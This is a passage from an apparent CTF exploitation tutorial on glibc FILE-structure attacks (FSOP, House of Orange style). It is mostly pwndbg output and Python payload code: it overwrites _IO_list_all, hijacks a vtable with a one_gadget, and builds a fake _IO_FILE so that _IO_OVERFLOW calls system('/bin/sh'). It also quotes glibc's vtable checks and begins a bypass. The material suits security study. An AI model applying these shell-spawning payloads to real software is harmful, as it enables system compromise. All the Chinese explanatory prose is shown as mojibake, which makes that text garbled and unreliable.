class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; x/10xg &amp;global_max_fast<br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-number">0x0000006e696d6461</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797808</span> &lt;root&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797818</span> &lt;old_realloc_hook&gt;:      <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797828</span> &lt;old_malloc_hook&gt;:       <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x7f6a34797838</span> &lt;added_atexit_handler&gt;:  <span class="hljs-number">0x0000000000000000</span>      <span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; x/s <span class="hljs-number">0x7f6a347977f8</span><br><span class="hljs-number">0x7f6a347977f8</span> &lt;global_max_fast&gt;:       <span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>é‡Šæ”¾å¤§å †å—å‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00007f6a34796540</span><br>pwndbg&gt; x/xg <span class="hljs-number">0x00007f6a34796540</span><br><span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt;:       <span class="hljs-number">0x00000000fbad2086</span><br></code></pre></td></tr></table></figure><p>é‡Šæ”¾å¤§å †å—åï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; x/xg &amp;_IO_list_all<br><span class="hljs-number">0x7f6a34796520</span> &lt;_IO_list_all&gt;:  <span class="hljs-number">0x00000000008b9420</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ _IO_list_all æˆåŠŸçš„è¢«æˆ‘ä»¬å †åœ°å€å–ä»£äº†ã€‚ä»è€Œæˆ‘ä»¬æ§åˆ¶äº†éå† IO ç»“æ„ä½“æ—¶çš„æ•´ä¸ªæµç¨‹ã€‚</p><p>å…¶ä¸­åç§»è®¡ç®—ï¼ˆè¿™é‡Œæˆ‘é‡æ–°è¿è¡Œäº†æ‰€ä»¥å’Œä¸Šé¢åœ°å€ä¸åŒä½†æ€è·¯ä¸å½±å“ï¼‰ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p &amp;main_arena.fastbinsY<br>$<span class="hljs-number">5</span> = (mfastbinptr (*)[<span class="hljs-number">10</span>]) <span class="hljs-number">0x7f8a7d7b0b28</span> &lt;main_arena+<span class="hljs-number">8</span>&gt;<br>pwndbg&gt; p &amp;_IO_list_all<br>$<span class="hljs-number">6</span> = (struct _IO_FILE_plus **) <span class="hljs-number">0x7f8a7d7b1520</span> &lt;_IO_list_all&gt;<br>pwndbg&gt; p/x <span class="hljs-number">0x7f8a7d7b1520</span>-<span class="hljs-number">0x7f8a7d7b0b28</span><br>$<span class="hljs-number">7</span> = <span class="hljs-number">0x9f8</span><br>pwndbg&gt; p/x <span class="hljs-number">2</span>*<span class="hljs-number">0x9f8</span>+<span class="hljs-number">0x10</span><br>$<span class="hljs-number">8</span> = <span class="hljs-number">0x1400</span><br></code></pre></td></tr></table></figure><p><strong>å†ç”¨ <code>fp</code> çœ‹çœ‹æˆ‘ä»¬ä¼ªé€ çš„ IO ç»“æ„ä½“ã€‚</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; parseheap<br>addr                prev                size                 status              fd                bk    <br><span class="hljs-number">0x8b9000</span>            <span class="hljs-number">0x0</span>                 <span class="hljs-number">0x420</span>                Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br><span class="hljs-number">0x8b9420</span>            <span class="hljs-number">0x420</span>               <span class="hljs-number">0x1410</span>               Used                <span class="hljs-literal">None</span>              <span class="hljs-literal">None</span><br>pwndbg&gt; fp <span class="hljs-number">0x8b9420</span><br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">1056</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x1411</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1411</span>&gt;,<br>    _IO_read_end = <span class="hljs-number">0x7f6a34796540</span> &lt;_IO_2_1_stderr_&gt; <span class="hljs-string">&quot;\206 \255&quot;</span>, &lt;incomplete sequence \<span class="hljs-number">373</span>&gt;,<br>    _IO_read_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_base = <span class="hljs-number">0x0</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x1</span> &lt;error: Cannot access memory at address <span class="hljs-number">0x1</span>&gt;,<br>    _IO_write_end = <span class="hljs-number">0x0</span>,<br>    _IO_buf_base = <span class="hljs-number">0x0</span>,<br>    _IO_buf_end = <span class="hljs-number">0x0</span>,<br>    _IO_save_base = <span class="hljs-number">0x0</span>,<br>    _IO_backup_base = <span class="hljs-number">0x0</span>,<br>    _IO_save_end = <span class="hljs-number">0x0</span>,<br>    _markers = <span class="hljs-number">0x0</span>,<br>    _chain = <span class="hljs-number">0x0</span>,<br>    _fileno = <span class="hljs-number">0</span>,<br>    _flags2 = <span class="hljs-number">0</span>,<br>    _old_offset = <span class="hljs-number">0</span>,<br>    _cur_column = <span class="hljs-number">0</span>,<br>    _vtable_offset = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    _shortbuf = <span class="hljs-string">&quot;&quot;</span>,<br>    _lock = <span class="hljs-number">0x0</span>,<br>    _offset = <span class="hljs-number">0</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0</span>,<br>    _mode = -<span class="hljs-number">1</span>,<br>    _unused2 = <span class="hljs-string">&quot;\377\377\377\377&quot;</span>, <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">15</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x602098</span> &lt;completed&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œçš„é‡ç‚¹æ˜¯æˆ‘ä»¬åŠ«æŒçš„ vtableï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p *(const struct _IO_jump_t *)<span class="hljs-number">0x602098</span><br>$<span class="hljs-number">4</span> = &#123;<br>  __dummy = <span class="hljs-number">0</span>,<br>  __dummy2 = <span class="hljs-number">0</span>,<br>  __finish = <span class="hljs-number">0x0</span>,<br>  __overflow = <span class="hljs-number">0x7f6a344c2247</span> &lt;exec_comm+<span class="hljs-number">2263</span>&gt;,<br>  __underflow = <span class="hljs-number">0x0</span>,<br>  __uflow = <span class="hljs-number">0x0</span>,<br>  __pbackfail = <span class="hljs-number">0x0</span>,<br>  __xsputn = <span class="hljs-number">0x0</span>,<br>  __xsgetn = <span class="hljs-number">0x0</span>,<br>  __seekoff = <span class="hljs-number">0x8b9010</span>,<br>  __seekpos = <span class="hljs-number">0x0</span>,<br>  __setbuf = <span class="hljs-number">0x0</span>,<br>  __sync = <span class="hljs-number">0x0</span>,<br>  __doallocate = <span class="hljs-number">0x0</span>,<br>  __read = <span class="hljs-number">0x0</span>,<br>  __write = <span class="hljs-number">0x0</span>,<br>  __seek = <span class="hljs-number">0x0</span>,<br>  __close = <span class="hljs-number">0x0</span>,<br>  __stat = <span class="hljs-number">0x0</span>,<br>  __showmanyc = <span class="hljs-number">0x0</span>,<br>  __imbue = <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° <code>__overflow</code> ä½ç½®å·²ç»è¢«å†™ä¸Šäº†æˆ‘ä»¬çš„ onegadget ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525000410526.png" alt="image-20220525000410526"></p><p>æ»¡è¶³è¿›å…¥æ¡ä»¶åï¼Œåœ¨ <code>_IO_cleanup</code> çš„ <code>_IO_flush_all_lockp</code> å‡½æ•°é‡Œé¢ä¼šè°ƒç”¨ç»“æ„ä½“ vtable çš„ <code>_IO_OVERFLOW</code> å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æå‰æ›¿ä»£å¥½çš„ <code>one_gadget</code> ã€‚</p><p><strong>è¿›å…¥ _IO_OVERFLOW æ¡ä»¶ï¼š</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-number">779</span>       <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>  <span class="hljs-number">780</span> <span class="hljs-meta">#<span class="hljs-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br>  <span class="hljs-number">781</span>     || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>  <span class="hljs-number">782</span>         &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>  <span class="hljs-number">783</span>                              &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>  <span class="hljs-number">784</span> <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-number">785</span>     )<br>â–º <span class="hljs-number">786</span>    &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br></code></pre></td></tr></table></figure><p>åˆ«çœ‹è¿™éƒ½æ˜¯ if åˆ¤æ–­è¯­å¥ï¼Œè¿™ç©æ„éµå¾ªä¸€ä¸ª<strong>çŸ­è·¯åŸåˆ™</strong>ï¼Œå°±æ˜¯å¦‚æœå·²ç»æœ‰æ¡ä»¶å¯ä»¥åˆ¤æ–­å‡º if ä¸ºå‡ï¼Œå°±ä¸ä¼šå»æ‰§è¡Œå‰©ä¸‹çš„åˆ¤æ–­è¯­å¥ã€‚æ‰€ä»¥æˆ‘ä»¬è¦æˆåŠŸçš„è°ƒç”¨ <code>_IO_OVERFLOW</code> ï¼Œå°±è¦ä¿è¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fp-&gt;_mode &lt;= <span class="hljs-number">0</span><br>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base<br></code></pre></td></tr></table></figure><p>å¦‚æœä½ æƒ³ä¸å¼€å»ä¿è¯å¦å¤–ä¸€å †æ¡ä»¶å½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p><p>è°ƒè¯•éƒ¨åˆ†åˆ°æ­¤å°±ç»“æŸäº†ã€‚</p><p>æ­¤å¤–ï¼Œç¨å¾®æä¸€å¥å°±æ˜¯è¿™é¢˜æˆ‘ä»¬å¦‚æœåœ¨ bss æ®µå†™çš„æ˜¯ system çš„è¯ï¼Œç»“æ„ä½“ä¹Ÿå¯ä»¥è¿™æ ·æ„é€ ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<br>fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span><br>fake_IO += p64(<span class="hljs-number">0x6020B0</span> - <span class="hljs-number">0x18</span>)<br></code></pre></td></tr></table></figure><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525001739503.png" alt="image-20220525001739503"></p><p>è¿™æ—¶å€™çš„ <strong>_IO_OVERFLOW</strong> å°±ç­‰åŒäº <code>system('/bin/sh\0');</code> èƒ½ç¨³å®š getshellã€‚</p><h5 id="æ³¨æ„"><a class="header-anchor" href="#æ³¨æ„">Â¶</a>æ³¨æ„</h5><p>æ³¨æ„çš„ç‚¹å°±æ˜¯ï¼Œæˆ‘ä»¬ _IO_list_all å†™çš„æ˜¯å †åœ°å€ï¼Œ<strong>æˆ‘ä»¬çš„ _flags å’Œ _IO_read_ptr æ˜¯è¢« prev_size å’Œ size å æ®</strong>çš„ã€‚è¿™å°±æ˜¯ä¸ºæ¯›æˆ‘ä»¬å†™çš„å†…å®¹æ˜¯ <code>fake_IO[0x10:]</code> ã€‚</p><p>æ‰€ä»¥æƒ³è¦ç¬¬äºŒç§æ–¹æ³• getshell çš„è¯è¦è®°å¾—æ›´æ”¹ä¸Šä¸ª chunk åœ¨ prev_size ä½çš„æ•°æ®ã€‚æœ€åæ­£å¸¸ getshell ï¼š</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220525122757746.png" alt="image-20220525122757746"></p><h3 id="åŸºæœ¬æ„é€ "><a class="header-anchor" href="#åŸºæœ¬æ„é€ ">Â¶</a>åŸºæœ¬æ„é€ </h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">FILE</span>(<span class="hljs-params">vtable_addr</span>):<br>    fake_IO = <span class="hljs-string">&#x27;/bin/sh\0&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span><br>    fake_IO += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">1</span>)<span class="hljs-comment"># fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0xC0</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fake_IO += p64(<span class="hljs-number">0xFFFFFFFFFFFFFFFF</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> <span class="hljs-comment"># _mode &lt;= 0</span><br>    fake_IO += p64(vtable_addr - <span class="hljs-number">0x18</span>)<br>    <span class="hljs-keyword">return</span> fake_IO<br></code></pre></td></tr></table></figure><hr><h2 id="2-24-Libc-2-27-3ubuntu1-2"><a class="header-anchor" href="#2-24-Libc-2-27-3ubuntu1-2">Â¶</a>2.24 =&lt; Libc &lt;= 2.27-3ubuntu1.2</h2><p>ä¸ºæ¯›æ˜¯ 2.27-3ubuntu1.2 æ˜¯å› ä¸ºä¸‹é¢è¿™ä¿© ğŸ‘´ åœ¨ 2.27-3ubuntu1.4 è¯•è¿‡äº†ä¸è¡Œã€‚</p><h3 id="vtable-æ£€æµ‹ç»•è¿‡"><a class="header-anchor" href="#vtable-æ£€æµ‹ç»•è¿‡">Â¶</a>vtable æ£€æµ‹ç»•è¿‡</h3><h4 id="æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç "><a class="header-anchor" href="#æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç ">Â¶</a>æ²¡å•¥å¿…è¦çœ‹çš„æ£€æŸ¥ä»£ç </h4><p>Libc 2.24 å¾€ä¸Šèµ°å°±æœ‰äº†å¯¹ vtable çš„æ£€æŸ¥ã€‚ä½†åŸºæœ¬æ€è·¯è¿˜æ˜¯æ²¡æœ‰å˜ï¼ŒåŠ«æŒå‡½æ•°æŒ‡é’ˆï¼Œåªè¦æŒæ¡ç»•è¿‡æ€è·¯æœ¬è´¨è¿˜æ˜¯ä¸€æ ·çš„ã€‚</p><p>åœ¨ 2.24 ç‰ˆæœ¬çš„ glibc ä¸­ï¼Œå…¨æ–°åŠ å…¥äº†é’ˆå¯¹ IO_FILE_plus çš„ vtable åŠ«æŒçš„æ£€æµ‹æªæ–½ï¼Œglibc ä¼šåœ¨è°ƒç”¨è™šå‡½æ•°ä¹‹å‰é¦–å…ˆæ£€æŸ¥ vtable åœ°å€çš„åˆæ³•æ€§ã€‚</p><p>é¦–å…ˆä¼šéªŒè¯ vtable æ˜¯å¦ä½äº <strong>_IO_vtable</strong> æ®µï¼ˆæ®µå†…ä¸€å®šåç§»èŒƒå›´è¿˜æ˜¯æ¯”è¾ƒå®½æ¾çš„ï¼‰ä¸­ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±æ­£å¸¸æ‰§è¡Œï¼Œå¦åˆ™ä¼šè°ƒç”¨ *** _IO_vtable_check*** åšè¿›ä¸€æ­¥åˆæ³•æ€§æ£€æŸ¥ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> _IO_vtable_check (<span class="hljs-type">void</span>) attribute_hidden;<br><br><span class="hljs-comment">/* Perform vtable pointer validation.  If validation fails, terminate</span><br><span class="hljs-comment">   the process.  */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *<br><span class="hljs-title function_">IO_validate_vtable</span> <span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> _IO_jump_t *vtable)</span><br>&#123;<br>  <span class="hljs-comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span><br><span class="hljs-comment">     section.  */</span><br>  <span class="hljs-type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *ptr = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *) vtable;<br>  <span class="hljs-type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (offset &gt;= section_length)) <span class="hljs-comment">//offset å¤§äº section_length , è°ƒç”¨æ£€æŸ¥å‡½æ•°</span><br>    <span class="hljs-comment">/* The vtable pointer is not in the expected section.  Use the</span><br><span class="hljs-comment">       slow path, which will terminate the process if necessary.  */</span><br>    _IO_vtable_check ();<br>  <span class="hljs-keyword">return</span> vtable;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> attribute_hidden<br>_IO_vtable_check (<span class="hljs-type">void</span>)<br>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SHARED</span><br>  <span class="hljs-comment">/* Honor the compatibility flag.  */</span><br>  <span class="hljs-type">void</span> (*flag) (<span class="hljs-type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PTR_DEMANGLE</span><br>  PTR_DEMANGLE (flag);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-keyword">if</span> (flag == &amp;_IO_vtable_check)<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯å¤–éƒ¨é‡æ„çš„vtable</span><br>    <span class="hljs-keyword">return</span>;<br><br>  <span class="hljs-comment">/* In case this libc copy is in a non-default namespace, we always</span><br><span class="hljs-comment">     need to accept foreign vtables because there is always a</span><br><span class="hljs-comment">     possibility that FILE * objects are passed across the linking</span><br><span class="hljs-comment">     boundary.  */</span><br>  &#123;<br>    Dl_info di;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">link_map</span> *<span class="hljs-title">l</span>;</span><br>    <span class="hljs-keyword">if</span> (_dl_open_hook != <span class="hljs-literal">NULL</span><br>        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, <span class="hljs-literal">NULL</span>) != <span class="hljs-number">0</span><br>            &amp;&amp; l-&gt;l_ns != LM_ID_BASE))<span class="hljs-comment">//æ£€æŸ¥æ˜¯å¦æ˜¯åŠ¨æ€é“¾æ¥åº“ä¸­çš„vtable</span><br>      <span class="hljs-keyword">return</span>;<br>  &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* !SHARED */</span></span><br>  <span class="hljs-comment">/* We cannot perform vtable validation in the static dlopen case</span><br><span class="hljs-comment">     because FILE * handles might be passed back and forth across the</span><br><span class="hljs-comment">     boundary.  Therefore, we disable checking in this case.  */</span><br>  <span class="hljs-keyword">if</span> (__dlopen != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  __libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ä¸Šé¢è¿™äº›æ²¡æœ‰ç”¨</strong>ï¼Œä¸»è¦çœ¼ç†Ÿä¸€ä¸‹è¿™ä¸ªï¼Œä¸€èˆ¬è¿™ä¸ªå‡ºæ¥äº†è¯´æ˜ä½ çš„ vtable æ²¡ ğŸ‘ å¥½ï¼Œè°ƒè¯•çœ‹çœ‹è‡ªå·±çš„æ•°æ®æœ‰æ²¡æœ‰æ„é€ é”™ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">__libc_fatal (<span class="hljs-string">&quot;Fatal error: glibc detected an invalid stdio handle\n&quot;</span>);<br></code></pre></td></tr></table></figure><h4 id="ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯"><a class="header-anchor" href="#ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯">Â¶</a>ç»å…¸ä¿©å¤§åŸºæœ¬ç»•è¿‡æ€è·¯</h4><p>å› ä¸ºåŠ å…¥äº†å¯¹ vtable ä½ç½®çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬çå‡ æŠŠåŠ«æŒ vtable çš„è€ä¸€å¥—å·²ç»æ²¡ç”¨äº†ï¼Œä½†æ˜¯åŸºæœ¬åˆ©ç”¨æ€è·¯è¿˜æ˜¯ç›¯ç€è¿™ä¸ª <code>_IO_OVERFLOW</code> ã€‚</p><p>ä¸èƒ½å†™è‡ªå·±çš„ vtable ï¼Œé‚£å°±æ‰¾åŸæœ¬ç¨‹åºä¸­å°±å­˜åœ¨çš„ vtableï¼Œåˆ©ç”¨å…¶ä¸­çš„å‡½æ•°æŒ‡é’ˆã€‚</p><p>ç›®å‰ä¸»æµæ€è·¯å°±æ˜¯åˆ©ç”¨ <code>_IO_str_jumps</code> æˆ– <code>_IO_wstr_jumps</code> ä¸­çš„ <code>_IO_str_overflow()</code> å’Œ <code>_IO_str_finish()</code> å‡½æ•°ã€‚</p><p>æ„æ€å°±æ˜¯åœ¨ vtable ä¸Šå†™ä¸Š <code>_IO_str_jumps</code>  <strong>åŠ å‡ä¸€æ®µåç§»</strong>æ¥ä½¿å¾— IO ç»“æ„ä½“åœ¨ <code>_IO_OVERFLOW</code> <strong>æŸ¥ vtable è¡¨æ—¶</strong>è°ƒç”¨ <code>_IO_str_finish</code> æˆ– <code>_IO_str_overflow</code> è¿™ç±»å‡½æ•°ã€‚</p><p>ç›¸æ¯” 2.23 ï¼Œæœ€é‡è¦çš„å°±æ˜¯<strong>å¯¹ <code>_flags</code> æ¯”è¾ƒä¸¥æ ¼</strong>ï¼Œè¿™é‡Œéœ€è¦ç‚¹ç¯‡å¹…çœ‹æºç æ‰èƒ½è¯´æ˜ç™½ã€‚</p><h3 id="IO-str-jumps"><a class="header-anchor" href="#IO-str-jumps">Â¶</a>_IO_str_jumps</h3><p>å°±æ˜¯ä¸€å¼  vtable å‡½æ•°è¡¨ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_str_jumps</span> <span class="hljs-title">libio_vtable</span> =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_str_finish),<br>  JUMP_INIT(overflow, _IO_str_overflow),<br>  JUMP_INIT(underflow, _IO_str_underflow),<br>  JUMP_INIT(uflow, 